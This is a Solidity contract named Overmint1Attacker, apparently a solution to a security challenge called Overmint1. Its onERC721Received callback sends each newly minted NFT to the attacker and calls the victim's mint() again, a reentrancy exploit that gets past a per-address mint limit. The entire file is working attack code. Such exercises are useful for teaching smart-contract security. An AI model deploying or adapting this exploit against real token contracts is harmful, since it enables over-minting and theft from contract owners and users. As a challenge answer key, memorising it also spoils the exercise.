// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

import { Overmint1 } from "./Overmint1.sol";
import { IERC721Receiver } from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Overmint1Attacker is IERC721Receiver {
    using Address for address;
   
    Overmint1 public victim;
    address public attacker;

    constructor(address _victim) {
        victim = Overmint1(_victim);
        attacker = msg.sender;
    }

    function onERC721Received(address, address, uint256 tokenId, bytes calldata) external override returns (bytes4) {
        victim.transferFrom(address(this), attacker, tokenId);
        if (!victim.success(attacker)) victim.mint();
        return this.onERC721Received.selector;
    }

    function attack() external {
        victim.mint();
    }
}
